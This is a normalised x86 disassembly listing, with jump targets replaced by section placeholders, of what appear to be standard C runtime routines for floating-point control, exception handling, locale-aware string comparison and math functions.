mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffeb
or eax 0x8
cmp eax 0x200
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffd
or eax ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x20 ] eax
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
mov eax [ ecx + 0x60 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x60 ] eax
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ eax + 0x60 ] 0xffffffe1
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffe7
or eax 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffe
or eax 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_444e9c
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
push edi
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] 0x1
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
mov edx 0xfffff3ff
and eax 0x3
sub eax 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
sub eax 0x1
je r-xdata
fld [ ecx + 0x50 ]
fstp [ ebx ]
fld [ ecx + 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
sub eax 0x1
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] 0x0
pop esi
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax 0x0
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_446a98
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4467a7
add esp 0x1c
pop ebp
retn
sub_446abb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x21
add eax 0xfffffffe
cmp eax 0x1
ja r-xdata
pop ebp
retn
call sub_430f56
mov [ eax ] 0x22
pop ebp
retn
sub_446aea
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub esp 0x20
xor ecx ecx
mov eax ecx
mov ecx [ eax * 8 + r--data ]
inc eax
cmp eax 0x1d
jl r-xdata
push 0xffff
push [ ebp + 0x28 ]
call sub_444eaf
push [ ebp + 0x8 ]
call sub_446abb
fld [ ebp + 0x20 ]
add esp 0xc
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_444eaf
lea eax [ ebp - 0x20 ]
push eax
call sub_429e7b
add esp 0xc
test eax eax
jne r-xdata
cmp [ eax * 8 + r--data ] edx
je r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
pop esi
jmp r-xdata
push esi
call sub_446abb
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
sub_446b8c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_4349f1
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push eax
push [ ebp + 0x18 ]
call sub_4349f1
pop ecx
pop ecx
sub esi eax
jne r-xdata
test eax eax
je r-xdata
xor eax eax
test esi esi
setns al
lea eax [ eax * 2 + 0x1 ]
push 0x2
pop eax
jmp r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42f82a
jmp r-xdata
pop esi
pop ebp
retn
sub_446bf4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x20 ] edi
test esi esi
jle r-xdata
cmp esi 0xffffffff
jge r-xdata
push esi
push edi
call sub_446041
pop ecx
mov esi eax
mov eax [ ebp - 0x24 ]
pop ecx
mov ebx [ ebp + 0x20 ]
test ebx ebx
jle r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0xffffffff
jl r-xdata
push ebx
push eax
call sub_446041
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x24 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov [ ebp + 0x24 ] eax
cmp esi ebx
jne r-xdata
test ebx ebx
jne r-xdata
cmp ebx 0x1
jle r-xdata
push 0x2
xor edi edi
push edi
push edi
push esi
push [ ebp - 0x20 ]
push 0x9
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
cmp esi 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
mov eax edi
mov [ ebp - 0x1c ] edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
test esi esi
jle r-xdata
pop eax
jmp r-xdata
mov ebx [ ebp - 0x1c ]
push [ ebp - 0x28 ]
push eax
push esi
push [ ebp - 0x20 ]
mov esi [ ebp + 0x24 ]
push 0x1
push esi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d3eb
mov [ ebp - 0x1c ] eax
pop ecx
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_448dc0
mov eax esp
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test ebx ebx
jle r-xdata
push 0x2
pop eax
cmp [ ebp - 0x18 ] eax
jb r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push 0x9
push esi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push 0x2
pop eax
cmp [ ebp - 0x18 ] eax
jb r-xdata
cmp [ ebp - 0x12 ] 0x0
lea ecx [ ebp - 0x12 ]
je r-xdata
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
test eax eax
je r-xdata
add eax 0x8
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea ecx [ ebp - 0x12 ]
je r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
mov esi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov bl [ edi ]
cmp bl [ ecx ]
jb r-xdata
mov ebx [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push esi
push ebx
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d3eb
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_448dc0
mov esi esp
test esi esi
je r-xdata
mov bl [ esi ]
cmp bl [ ecx ]
jb r-xdata
add ecx eax
cmp [ ecx ] 0x0
jne r-xdata
cmp bl dl
jbe r-xdata
push ebx
call sub_43a5a0
pop ecx
mov eax edi
mov ebx [ ebp - 0x1c ]
push edi
push edi
push edi
push [ ebp - 0x20 ]
push esi
push [ ebp - 0x28 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x2c ]
call sub_42f82a
mov edi eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
add ecx eax
cmp [ ecx ] 0x0
jne r-xdata
cmp bl dl
jbe r-xdata
jmp r-xdata
push esi
call sub_43a5a0
pop ecx
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
jmp r-xdata
sub_446e9c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
push [ ebp + 0x24 ]
lea eax [ ebp - 0xc ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_446bf4
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_446ee4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
xor eax eax
push eax
push eax
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42feb7
pop esi
pop ebp
retn
push esi
push [ ebp + 0x10 ]
call sub_4349f1
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
mov esi eax
sub_446f22
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x1f
je r-xdata
pop ebp
retn
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
mov eax 0x10100010
test cl 0x4
je r-xdata
or eax 0x8080008
test cl 0x2
je r-xdata
or eax 0x4040004
test cl 0x1
je r-xdata
or eax 0x2020002
or eax 0x1010001
sub_446f65
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x7e80
je r-xdata
mov eax ecx
pop ebp
retn
test dl dl
jns r-xdata
push edi
mov edi 0x200
test edi edx
je r-xdata
push 0x10
pop ecx
test edx 0x400
je r-xdata
or ecx 0x8
test edx 0x800
je r-xdata
or ecx 0x4
test edx 0x1000
je r-xdata
or ecx 0x2
push esi
mov esi 0x6000
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x4000
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x2000
je r-xdata
or ecx 0x100
jmp r-xdata
pop edi
or ecx edi
sub_446fe2
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0xc3d
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x1
je r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ecx
test dl 0x8
je r-xdata
or ecx 0x8
test dl 0x10
je r-xdata
or ecx 0x4
test dl 0x20
je r-xdata
or ecx 0x2
push esi
mov esi 0xc00
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x800
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or ecx 0x100
jmp r-xdata
or ecx 0x200
sub_447055
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x3d
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
mov eax 0x10000010
test cl 0x8
je r-xdata
or eax 0x8000008
test cl 0x10
je r-xdata
or eax 0x4000004
test cl 0x20
je r-xdata
or eax 0x2000002
or eax 0x1000001
sub_447098
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x3d
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
mov eax 0x100010
test cl 0x8
je r-xdata
or eax 0x80008
test cl 0x10
je r-xdata
or eax 0x40004
test cl 0x20
je r-xdata
or eax 0x20002
or eax 0x10001
sub_4470db
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
test dl 0x8
je r-xdata
inc ecx
test dl 0x4
je r-xdata
or ecx 0x4
test dl 0x2
je r-xdata
or ecx 0x8
test dl 0x1
je r-xdata
or ecx 0x10
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x20
test edx 0x200
je r-xdata
or ecx 0xc00
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x400
jmp r-xdata
or ecx 0x800
sub_44714c
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
push edi
mov edi 0x200
test dl 0x8
je r-xdata
mov ecx 0x80
test dl 0x4
je r-xdata
or ecx edi
test dl 0x2
je r-xdata
or ecx 0x400
test dl 0x1
je r-xdata
or ecx 0x800
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1000
test edi edx
je r-xdata
or ecx 0x6000
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x2000
jmp r-xdata
pop edi
or ecx 0x4000
sub_4471cc
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test dl 0x1f
je r-xdata
mov eax ecx
pop ebp
retn
push esi
mov esi 0x10000010
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
mov esi 0x8000008
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
inc ecx
mov esi 0x4000004
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
or ecx 0x4
mov esi 0x2000002
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x8
mov eax 0x1000001
and edx eax
cmp edx eax
jne r-xdata
or ecx 0x10
or ecx 0x20
sub_44722d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test dl 0x1f
je r-xdata
mov eax ecx
pop ebp
retn
push esi
mov esi 0x100010
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
mov esi 0x80008
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
inc ecx
mov esi 0x40004
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
or ecx 0x4
mov esi 0x20002
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x8
mov eax 0x10001
and edx eax
cmp edx eax
jne r-xdata
or ecx 0x10
or ecx 0x20
sub_44728e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
and [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
fnstcw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx eax [ ebp - 0x4 ]
push esi
push eax
call sub_446fe2
push [ ebp - 0x8 ]
mov esi eax
call sub_446f65
pop ecx
or eax esi
pop ecx
and eax 0x31f
pop esi
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x8 ]
sub_4472d1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
xor ecx ecx
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x8 ] ecx
fnstsw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx edx [ ebp - 0x4 ]
mov eax ecx
test dl 0x3d
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
test dl 0x3d
je r-xdata
test dl 0x1
je r-xdata
or eax ecx
and eax 0x1f1f001f
mov esp ebp
pop ebp
retn
test dl 0x1
je r-xdata
test dl 0x4
je r-xdata
mov eax 0x100010
test dl 0x4
je r-xdata
mov ecx 0x10000010
test dl 0x8
je r-xdata
or eax 0x80008
test dl 0x8
je r-xdata
or ecx 0x8000008
test dl 0x10
je r-xdata
or eax 0x40004
test dl 0x10
je r-xdata
or ecx 0x4000004
test dl 0x20
je r-xdata
or eax 0x20002
test dl 0x20
je r-xdata
or ecx 0x2000002
or eax 0x10001
or ecx 0x1000001
sub_447379
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
mov ebx 0x31f
push ebx
call sub_4470db
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x20 ]
call sub_4470db
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x20 ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push ebx
call sub_44714c
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_44714c
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_4473f9
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
mov ebx 0x1f1f001f
push ebx
call sub_44722d
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x1c ]
call sub_44722d
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x1c ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push ebx
call sub_4471cc
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_4471cc
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_44749e
mov edx 0x0
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
cmpsd xmm1 xmm0 0x0
pextrw eax xmm1 0x0
cmp eax 0x0
ja r-xdata
sub ecx 0x3fe
add ecx edx
cvtsi2sd xmm6 ecx
unpcklpd xmm6 xmm6
shl ecx 0xa
add eax ecx
mov ecx 0x10
mov edx 0x0
cmp eax 0x0
cmove edx ecx
movapd xmm1 [ r--data ]
movapd xmm3 xmm0
movapd xmm2 [ r--data ]
mulpd xmm1 xmm0
mulpd xmm3 xmm3
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm3
movapd xmm5 [ r--data ]
mulpd xmm6 xmm5
movapd xmm5 [ edx + r--data ]
andpd xmm4 xmm5
addpd xmm7 xmm6
addpd xmm7 xmm4
mulpd xmm1 xmm0
mulsd xmm3 xmm0
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulpd xmm2 xmm0
movapd xmm6 xmm7
unpckhpd xmm6 xmm6
mulpd xmm1 xmm3
sub esp 0x10
movapd xmm0 xmm1
addpd xmm1 xmm2
unpckhpd xmm0 xmm0
addsd xmm0 xmm1
addsd xmm0 xmm6
addsd xmm0 xmm7
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
movlpd xmm2 [ r--data ]
divsd xmm2 xmm0
movlpd xmm1 [ r--data ]
mov edx 0x8
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
sub esp 0x1c
movlpd [ esp + 0x10 ] xmm1
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
add edx 0x10
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_435f92
fld [ esp + 0x10 ]
add esp 0x1c
retn
movlpd xmm1 [ r--data ]
mulsd xmm0 xmm1
mov edx 0xffffffcc
jmp r-xdata
cmp ecx 0x7fe
ja r-xdata
movapd xmm5 xmm0
unpcklpd xmm0 xmm0
psrlq xmm5 0x34
pextrw ecx xmm5 0x0
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
movapd xmm3 [ r--data ]
movapd xmm4 [ r--data ]
movapd xmm6 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm3
addpd xmm4 xmm0
pextrw eax xmm4 0x0
and eax 0x7f0
movapd xmm4 [ eax + r--data ]
movapd xmm7 [ eax + r--data ]
andpd xmm6 xmm0
subpd xmm0 xmm6
mulpd xmm6 xmm4
subpd xmm6 xmm2
addsd xmm7 xmm6
mulpd xmm0 xmm4
movapd xmm4 xmm0
addpd xmm0 xmm6
and ecx 0xfff
sub ecx 0x1
cmp ecx 0x7fd
ja r-xdata
add ecx 0x1
and ecx 0x7ff
cmp ecx 0x7ff
jae r-xdata
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm2
cmpsd xmm2 xmm0 0x0
pextrw eax xmm2 0x0
cmp eax 0x0
je r-xdata
movlpd xmm2 [ esp + 0x4 ]
movlpd xmm0 [ esp + 0x4 ]
movd eax xmm2
psrlq xmm2 0x20
movd ecx xmm2
and ecx 0xfffff
or eax ecx
cmp eax 0x0
je r-xdata
xorpd xmm1 xmm1
divsd xmm1 xmm1
mov edx 0x9
mov edx 0x3e9
jmp r-xdata
fld [ r--data ]
retn
mov edx 0x3e9
jmp r-xdata
sub_44770b
jmp r-xdata
mov [ ebp - 0x90 ] 0xfe
or ch ch
jne r-xdata
call sub_4478a1
or eax eax
je r-xdata
fxch st1
jmp sub_4430a3
xor ch ch
cmp eax 0x2
je r-xdata
call sub_44785e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
fxch st1
fabs
jmp r-xdata
not ch
test dl 0x40
jne r-xdata
fld1
fdivrp st1
fyl2x
jmp r-xdata
or ch ch
je r-xdata
fscale
jmp sub_442fe8
fchs
sub_447721
mov [ ebp - 0x90 ] 0xfe
xor ch ch
fldl2e
fmulp st1
call sub_44785e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
test dl 0x40
jne r-xdata
fld1
fdivrp st1
or ch ch
je r-xdata
fscale
jmp sub_442fe8
fchs
sub_4477cd
call sub_4478a1
fstp st0
fstp st0
or cl cl
jne r-xdata
mov [ ebp - 0x90 ] 0x2
fld [ r--data ]
cmp eax 0x1
jne r-xdata
fldz
cmp eax 0x1
jne r-xdata
retn
or ch ch
je r-xdata
or ch ch
je r-xdata
fchs
jmp r-xdata
fchs
sub_44785e
fld st0
fabs
fld [ r--data ]
fcompp
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x41
jne r-xdata
pop eax
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
fld st0
frndint
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
mov dl [ ebp - 0x9f ]
fxch st1
fsub st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fabs
f2xm1
retn
mov [ ebp - 0x90 ] 0x4
jmp sub_442ff6
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
retn
fchs
sub_4478a1
fld st0
frndint
fcomp st1
fwait
fnstsw ax
sahf
jne r-xdata
mov eax 0x0
jmp r-xdata
fld st0
fmul [ r--data ]
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
je r-xdata
retn
mov eax 0x2
jmp r-xdata
mov eax 0x1
sub_4478d5
push esi
sub esp 0x74
mov esi esp
push esi
sub esp 0x8
fstp [ esp ]
sub esp 0x8
fstp [ esp ]
fwait
fnsave [ esi + 0x8 ]
call sub_447bfc
add esp 0x14
frstor [ esi + 0x8 ]
fld [ esi ]
add esp 0x74
pop esi
test eax eax
je r-xdata
retn
jmp sub_4430b6
sub_4479c0
mov edi edi
push ebp
mov ebp esp
movzx ecx [ ebp + 0xe ]
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
add eax 0xfffffc02
shr ecx 0x4
and ecx 0x7ff
add eax ecx
push eax
push ecx
push ecx
fstp [ esp ]
call sub_447b05
add esp 0xc
pop ebp
retn
sub_4479ef
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fucom st1
fnstsw ax
push edi
test ah 0x44
jpe r-xdata
push esi
mov si [ ebp + 0xe ]
movzx eax si
test eax 0x7ff0
jne r-xdata
fstp st1
xor edi edi
jmp r-xdata
push 0x0
push ecx
fstp st0
push ecx
fstp [ esp ]
call sub_447b05
movzx edi si
add esp 0xc
shr edi 0x4
and edi 0x7ff
sub edi 0x3fe
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test ecx 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
pop ebp
retn
fcompp
mov edi 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
test edx edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xffef
and si cx
mov [ ebp + 0xe ] si
test eax eax
je r-xdata
add ecx ecx
mov [ ebp + 0xc ] ecx
test edx edx
jns r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push 0x0
push ecx
push ecx
fstp [ esp ]
call sub_447b05
add esp 0xc
jmp r-xdata
mov eax 0x8000
or si ax
mov [ ebp + 0xe ] si
add edx edx
dec edi
test [ ebp + 0xe ] 0x10
je r-xdata
or ecx 0x1
mov [ ebp + 0xc ] ecx
pop esi
mov si [ ebp + 0xe ]
mov [ ebp + 0x8 ] edx
sub_447adc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
movzx eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
and eax 0x800f
shl ecx 0x4
fstp [ ebp - 0x8 ]
or ecx eax
